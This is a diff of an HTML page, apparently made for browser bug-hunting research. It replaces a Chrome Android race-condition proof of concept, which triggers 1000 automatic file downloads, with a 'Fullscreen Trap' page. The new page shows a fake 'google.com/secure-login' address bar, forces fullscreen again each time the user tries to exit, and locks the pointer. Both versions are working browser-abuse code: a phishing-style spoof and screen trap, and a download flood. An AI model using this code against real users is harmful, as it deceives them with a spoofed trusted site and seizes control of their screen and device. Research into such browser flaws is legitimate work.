@@ -3,68 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Race Condition Research - Chrome Android</title>
+    <title>Fullscreen Trap Research</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; background: #0f0f0f; color: #fff; }
-        .card { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #333; max-width: 450px; margin: auto; }
-        .btn-hunt {
-            background: linear-gradient(45deg, #d93025, #ff5252);
-            color: white; padding: 18px; border: none; border-radius: 10px;
-            font-weight: bold; width: 100%; font-size: 1.1rem; cursor: pointer;
-            box-shadow: 0 4px 15px rgba(217, 48, 37, 0.4);
+        body { 
+            margin: 0; padding: 0; background: black; color: white; 
+            font-family: sans-serif; display: flex; 
+            flex-direction: column; align-items: center; 
+            justify-content: center; height: 100vh; overflow: hidden;
         }
-        #status { margin-top: 20px; font-family: monospace; color: #00ff00; font-size: 0.9rem; text-align: left; }
+        .fake-ui {
+            position: absolute; top: 0; width: 100%; height: 60px;
+            background: #202124; display: flex; align-items: center;
+            padding: 0 15px; border-bottom: 1px solid #3c4043;
+            box-sizing: border-box; color: #e8eaed; font-size: 0.9rem;
+        }
+        .btn-lock {
+            background: #4285f4; color: white; padding: 20px 40px;
+            border: none; border-radius: 50px; font-weight: bold;
+            font-size: 1.2rem; cursor: pointer; z-index: 10;
+        }
+        #status { margin-top: 20px; color: #fbbc04; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>🛡️ Bug Hunter Lab</h2>
-        <p style="color: #bbb; font-size: 0.9rem;">
-            Tujuan: Membuktikan <b>Persistence</b> setelah user klik <b>BATAL</b>.
-        </p>
-        
-        <button class="btn-hunt" onclick="startHunting()">
-            LAUNCH ASYNC INJECTION
-        </button>
-
-        <div id="status">Status: Ready...</div>
+    <div class="fake-ui" id="fakeBar" style="display: none;">
+        <span style="margin-right: 10px;">🔒</span> google.com/secure-login
     </div>
 
+    <button class="btn-lock" onclick="toggleTrap()">
+        AKTIFKAN SECURE MODE
+    </button>
+
+    <div id="status">Status: Unlocked</div>
+
     <script>
-        async function startHunting() {
-            const statusDiv = document.getElementById('status');
-            const total = 1000; // Jumlah yang cukup untuk membuktikan antrean sistem
-            
-            statusDiv.innerHTML = "[!] Initializing Task Queue...";
+        let trapActive = false;
 
-            for (let i = 1; i <= total; i++) {
-                const link = document.createElement('a');
-                
-                // Data URI minimalis
-                const data = `Evidence ID: ${i} | Timestamp: ${Date.now()}`;
-                link.href = "data:text/plain;base64," + btoa(data);
-                link.download = `race_evidence_${i}.txt`;
-                
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-
-                // Update UI log setiap 50 file
-                if (i % 50 === 0) {
-                    statusDiv.innerHTML += `<br>[+] Queued: ${i}/${total}`;
-                }
-
-                /* KUNCI RACE CONDITION:
-                   Memberikan jeda 1ms agar Chrome sempat memproses UI (muncul dialog),
-                   tapi antrean JS tetap berjalan di background secepat mungkin.
-                */
-                await new Promise(resolve => setTimeout(resolve, 1));
-            }
-            
-            statusDiv.innerHTML += "<br>[DONE] All tasks sent. Check OS response.";
+        function toggleTrap() {
+            trapActive = true;
+            document.getElementById('status').innerText = "Status: TRAPPED!";
+            document.getElementById('fakeBar').style.display = "flex";
+            launchFullscreen();
         }
-    </script>
 
+        function launchFullscreen() {
+            const element = document.documentElement;
+            if (element.requestFullscreen) {
+                element.requestFullscreen();
+            } else if (element.webkitRequestFullscreen) {
+                element.webkitRequestFullscreen();
+            }
+        }
+
+        // KUNCI TRAP: Re-lock saat user mencoba keluar
+        document.addEventListener('fullscreenchange', (event) => {
+            if (!document.fullscreenElement && trapActive) {
+                console.log("[!] User tried to escape! Re-locking...");
+                // Memberikan sedikit delay agar tidak langsung terblokir browser
+                setTimeout(() => {
+                    launchFullscreen();
+                }, 100); 
+            }
+        });
+
+        // POINTER LOCK (Opsional, lebih kerasa di Desktop/Chrome OS)
+        document.addEventListener('click', () => {
+            if (trapActive) {
+                document.body.requestPointerLock = document.body.requestPointerLock || 
+                                                 document.body.webkitRequestPointerLock;
+                document.body.requestPointerLock();
+            }
+        });
+    </script>
 </body>
 </html>
